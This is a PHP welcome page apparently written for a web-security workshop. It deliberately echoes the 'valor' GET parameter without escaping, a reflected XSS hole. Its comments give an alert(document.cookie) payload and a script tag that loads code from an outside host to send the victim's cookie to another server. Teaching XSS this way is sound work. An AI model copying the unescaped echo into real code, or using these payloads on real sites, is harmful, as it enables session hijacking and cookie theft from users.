<?php
include('session.php');
?>
<!DOCTYPE HTML>
<html>

<head>
    <title>Página de Inicio</title>
    <!-- Custom Theme files -->
    <link href="estilo.css" rel="stylesheet" type="text/css" media="all" />
    <!-- for-mobile-apps -->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="keywords" content="Flat Login Form Widget Responsive, Login form web template, Sign up Web Templates, Flat Web Templates, Login signup Responsive web template, Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design" />
    <!-- //for-mobile-apps -->
    <!--Google Fonts-->
    <link href='//fonts.googleapis.com/css?family=Signika:400,600' rel='stylesheet' type='text/css'>
    <!--google fonts-->
</head>

<body>
    <!--header start here-->
    <h1>Página de Inicio</h1>
    <div class="header agile">
        <div class="wrap">
            <div class="login-main wthree">
                <div class="login">
                    <h3>Bienvenid@ al sistema <i><?php echo $login_session; ?></i></h3>


                    <?php
                    //Ejemplo 1: inyección XSS (Cross-Site Scripting)
                    //<a href='' onclick=javascript=alert(document.cookie)>link</a>



                    //Ejemplo 2: envío la cookie a otro servidor
                    /*
                    <SCRIPT SRC=https://appsweb.dev/tallerctc/jsxss.js></SCRIPT>

                    
                    */

                    if (isset($_GET["valor"])) {
                        echo "Aquí podrá visualizar el parámetro: " . $_GET["valor"];
                    }

                    ?>

                    <div class="clear"> </div>
                    <h4><a href="logout.php"> Cerrar sesión</a></h4>
                </div>


            </div>
        </div>
    </div>

</body>

</html>